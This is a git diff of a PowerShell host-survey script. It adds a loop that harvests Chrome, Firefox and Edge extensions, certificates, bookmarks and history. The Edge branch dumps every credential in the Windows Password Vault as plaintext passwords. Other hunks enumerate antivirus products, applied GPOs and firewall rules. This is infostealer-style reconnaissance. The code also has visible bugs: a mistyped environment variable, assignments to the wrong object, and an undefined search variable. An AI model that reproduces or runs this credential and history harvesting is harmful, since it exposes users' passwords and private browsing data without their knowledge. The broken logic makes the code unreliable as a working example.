@@ -49,81 +49,184 @@ $net = [PSCustomObject]@{
 #Miss wifi 
 
 
+#------------- All-WebBrowser -------------#
 
-#------------- Default Web-Browser -------------#
+$browserList = Get-ItemProperty HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*, HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.DisplayName -like "*chrome*" -or $_.DisplayName -like "*firefox*" -or $_.DisplayName -like "*edge*" }
 
-# Get the default web browser version
-$startupMenuPath = 'HKLM:\SOFTWARE\Clients\StartMenuInternet'
-$defaultInternetPath = 'HKLM:\SOFTWARE\Clients\StartMenuInternet'
-$browserVersion = Get-ItemProperty  $startupMenuPath | Select-Object -ExpandProperty (Get-ItemProperty $defaultInternetPath | Where-Object {$_.Default}).Version
+$UserName = $end:UserName 
+$browserDataList = @()
+foreach ($browser in $browserList)
+{
+  $browserData = [PSCustomObject]@{
+    Name = $browser.DisplayName
+    version = $null
+    addOns = $null
+    certificates = $null
+    identifiers = $null
+    favorites = $null
+    history = $null
+  }
 
-# Get the names of installed browser add-ons
-$addOnsPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Ext\Settings'
-$addOns = Get-ChildItem $addOnsPath | Select-Object -ExpandProperty Name
+  if ($browser.UninstallString -like "*chrome*")
+  {
+    $browserData.version = Get-ItemProperty "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome" | Select-Object -ExpandProperty DisplayVersion
 
-# Get the thumbprints of installed user certificates
-$certificatesPath = 'Cert:\CurrentUser\My'
-$certificates = Get-ChildItem $certificatesPath | Select-Object -ExpandProperty Thumbprint
+    $browserData.addOns = Get-ChildItem "$($env:LOCALAPPDATA)\Google\Chrome\User Data\Default\Extensions\" -Directory
 
-# Get the names of registered identifiers
-$identifiersPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\IdentityCRL\StoredIdentities'
-$identifiers = Get-ChildItem $identifiersPath | Select-Object -ExpandProperty Name
+    $browserName = $browser.DisplayName -replace '.*?(Chrome).*', '$1'
+    $browserData.certificates = Get-ChildItem -Path "Cert:\CurrentUser\My" -Recurse |
+      Where-Object { $_.Issuer -like "*$browserName*" -or $_.Subject -like "*$browserName*" }
 
-# Get the URLs of user favorites
-$favoritesPath = "$env:USERPROFILE\Favorites"
-$favorites = (Get-ChildItem $favoritesPath -Recurse -Include *.url).FullName
+    $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks"
+    if (Test-Path $path)
+    {
+      $browserData.favorites = (Get-Content $path | ConvertFrom-Json).roots.bookmark_bar.children |
+        Where-Object { $_.type -eq "url" } |
+        Select-Object name, url
+    }
 
-# Get the URLs and titles of browser history
-$historyPath = "$env:LOCALAPPDATA\Microsoft\Windows\WebCache\V01"
-$history = Get-ChildItem $historyPath -Recurse | Where-Object {$_.Name -eq "WebCacheV01.dat"} | Select-Object -ExpandProperty FullName | ForEach-Object {((New-Object -ComObject 'Shell.Application').NameSpace('shell:').ParseName($_).GetFolder).Items()} | Select-Object -Property Name, Folder
+    $Path = "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History" 
+    if (-not (Test-Path -Path $Path))
+    { 
+      Write-Verbose "[!] Could not find Chrome History for username: $UserName" 
+    } 
+    $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?' 
+    $Value = Get-Content -Path "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History"|Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique 
+    $browserData.history = @()
+    $Value | ForEach-Object { 
+      $Key = $_ 
+      if ($Key -match $Search)
+      { 
+        $browserData += New-Object -TypeName PSObject -Property @{ 
+          User = $UserName 
+          Browser = 'Chrome' 
+          DataType = 'History' 
+          Data = $_ 
+        } 
+      } 
+    }
 
-$defaultWebBrowser = [PSCustomObject]@{
-  browserVersion = $browserVersion
-  addOns = $addOns
-  certificates = $certificates
-  identifiers = $identifiers
-  favorites = $favorites
-  history = $history
-}
+
+  } elseif ($browser.UninstallString -like "*firefox*")
+  {
+    $browserData.version = Get-ItemProperty "HKLM:\Software\Wow6432Node\Mozilla\Mozilla Firefox" | Select-Object -ExpandProperty CurrentVersion
+
+    $browserData.addOns = Get-ChildItem "$($env:APPDATA)\Mozilla\Firefox\Profiles\*\extensions\" -Directory
+
+    $browserName = $browser.DisplayName -replace '.*?(Firefox).*', '$1'
+    $browserData.certificates = Get-ChildItem -Path "Cert:\CurrentUser\My" -Recurse |
+      Where-Object { $_.Issuer -like "*$browserName*" -or $_.Subject -like "*$browserName*" }
+
+    $path = "$env:APPDATA\Mozilla\Firefox\Profiles"
+    if (Test-Path $path)
+    {
+      $profileData = Get-ChildItem $path | Select-Object -First 1
+      if ($profileData)
+      {
+        $file = "$($profileData.FullName)\places.sqlite"
+        $favorites = @()
+        if (Test-Path $file)
+        {
+          $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList "Data Source=$file;Version=3;"
+          $connection.Open()
+          $command = $connection.CreateCommand()
+          $command.CommandText = "SELECT moz_bookmarks.title, moz_places.url FROM moz_bookmarks JOIN moz_places ON moz_bookmarks.fk = moz_places.id WHERE moz_bookmarks.type = 1"
+          $reader = $command.ExecuteReader()
+          while ($reader.Read())
+          {
+            $favorites += @{
+              name = $reader.GetString(0)
+              url  = $reader.GetString(1)
+            }
+          }
+          $browserData.favorites = $favorites
+          $reader.Close()
+          $connection.Close()
+        }
+      }
 
 
-#------------- Firefox -------------#
+      $Path = "$Env:systemdrive\Users\$UserName\AppData\Roaming\Mozilla\Firefox\Profiles\"
+      if (-not (Test-Path -Path $Path))
+      {
+        Write-Verbose "[!] Could not find FireFox History for username: $UserName"
+      } else
+      {
+        $Profiles = Get-ChildItem -Path "$Path\*.default\" -ErrorAction SilentlyContinue
+        $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+        $Value = Get-Content $Profiles\places.sqlite | Select-String -Pattern $Regex -AllMatches |Select-Object -ExpandProperty Matches |Sort -Unique
+        $browserData.history = @()
+        $Value.Value |ForEach-Object {
+          if ($_ -match $Search)
+          {
+            ForEach-Object {
+              $browserData.history += New-Object -TypeName PSObject -Property @{
+                User = $UserName
+                Browser = 'Firefox'
+                DataType = 'History'
+                Data = $_
+              }    
+            }
+          }
+        }
+      }
+    }
 
-# Retrieve version information
-$firefoxPath = 'HKLM:\SOFTWARE\Mozilla\Mozilla Firefox'
-$firefoxVersion = (Get-ItemProperty -Path $firefoxPath -Name "CurrentVersion").CurrentVersion
 
-# Retrieve add-ons installed
-$firefoxAddOnsPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*\extensions"
-$firefoxAddOns = Get-ChildItem -Path $firefoxAddOnsPath -Directory | ForEach-Object { $_.Name }
+  } elseif ($browser.UninstallString -like "*edge*")
+  {
+    $browserData.version = Get-AppxPackage Microsoft.Edge | Select-Object -ExpandProperty Version
 
-# Retrieve installed user certificates
-$firefoxCertificatesPath ='"Cert:\CurrentUser\My'
-$firefoxCertificates = Get-ChildItem -Path $firefoxCertificatesPath | Select-Object -ExpandProperty Thumbprint
+    $browserData.addOns = Get-ChildItem "$($env:LOCALAPPDATA)\Microsoft\Edge\User Data\Default\Extensions\" -Directory
 
-# Retrieve registered identifiers
-$firefoxIdentifiersPath = 'HKCU:\Software\Mozilla\Firefox\RegisteredApplications'
-$firefoxIdentifiers = Get-Item -Path $firefoxIdentifiersPath | Select-Object -ExpandProperty Property
+    $browserName = $browser.DisplayName -replace '.*?(Edge).*', '$1'
+    $browserData.certificates = Get-ChildItem -Path "Cert:\CurrentUser\My" -Recurse |
+      Where-Object { $_.Issuer -like "*$browserName*" -or $_.Subject -like "*$browserName*" }
 
-# Get firefox Profiles
-$firefoxProfilePath = "$env:APPDATA\Mozilla\Firefox\Profiles\*"
-$firefoxProfile = (Get-ChildItem -Path $firefoxProfilePath -Directory | Select-Object -Last 1).FullName
+    $path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Favorites"
+    if (Test-Path $path)
+    {
+      $favorites = Get-ChildItem $path -Recurse |
+        Where-Object { $_.Extension -eq ".url" } |
+        ForEach-Object {
+          $content = Get-Content $_.FullName
+          $name = ($content -match "^(?i)Title=(.*)$")[1]
+          $url = ($content -match "^(?i)URL=(.*)$")[1]
+          @{
+            name = $name
+            url  = $url
+          }
+        }
+    }
 
-# Get favorites 
-$firefoxFavoritesPath = "$FirefoxProfile\bookmarkbackups"
-$firefoxFavorites = (Get-ChildItem -Path $firefoxFavoritesPath -Filter "bookmarks*.json" | Select-Object -Last 1).FullName
 
-# Get history
-$firefoxHistoryPath = "$FirefoxProfile\places.sqlite"
-$firefoxHistory = (Get-ChildItem -Path $firefoxHistoryPath).FullName
+    $Path = "$Env:systemdrive\Users\$UserName\AppData\Local\Microsoft\Edge\User Data\Default\History" 
+    if (-not (Test-Path -Path $Path))
+    { 
+      Write-Verbose "[!] Could not find Edge History for username: $UserName" 
+    } 
+    $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?' 
+    $Value = Get-Content -Path "$Env:systemdrive\Users\$UserName\AppData\Local\Microsoft\Edge\User Data\Default\History"|Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique 
+    $browserData.history = @()
+    $Value | ForEach-Object { 
+      $Key = $_ 
+      if ($Key -match $Search)
+      { 
+        $browserData.history = New-Object -TypeName PSObject -Property @{ 
+          User = $UserName 
+          Browser = 'Edge' 
+          DataType = 'History' 
+          Data = $_ 
+        } 
+      } 
+    }
+  
+    [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+    $vault = New-Object Windows.Security.Credentials.PasswordVault
+    $browser.identifiers = $vault.RetrieveAll() | ForEach-Object { $_.RetrievePassword();$_ } | Select-Object username,resource,password
 
-$firefox = [PSCustomObject]@{
-  version = $firefoxVersion
-  addOns = $firefoxAddOns
-  certificates = $firefoxCertificates
-  identifiers = $firefoxIdentifiers
-  favorites = $firefoxFavorites
-  history = $firefoxHistory
+  }
+  $browserDataList += $browserData
 }
 
 #------------- Longon cached -------------#
@@ -201,8 +304,7 @@ $firewallRules = [PSCustomObject]@{
 }
 
 # Retrieve the list of installed antivirus software
-$antivirus = Get-WMIObject -Class "Win32_Product" -NameSpace "root\cimv2" -ComputerName "." -filter "Name like '%antivirus%'" 2> $null
-
+$antivirus = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct
 $antivirusList = New-Object System.Collections.ArrayList
 # Save the name and version of each installed antivirus software
 Write-Output "Installed antivirus software:"
@@ -221,7 +323,7 @@ $configSRP = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName "Secur
 
 
 # Retrieve the list of applied GPOs
-$gpos = Get-GpResultantSetOfPolicy -ReportType Computer -ErrorAction SilentlyContinue 2> $null
+$gpos = Get-GpResultantSetOfPolicy -ReportType Computer -ErrorAction SilentlyContinue
 
 $GPOInformations = New-Object System.Collections.ArrayList
 foreach ($gpo in $gpos.AppliedGPOs)
@@ -269,8 +371,7 @@ $security = [PSCustomObject]@{
 # Recap object
 $finalObject = [PSCustomObject]@{
   net = $net
-  defaultWebBrowser = $defaultWebBrowser
-  firefox = $firefox
+  WebBrowser = $browserDataList
   accounts = $accounts
   applications = $applications
   startMenu = $startMenuItems
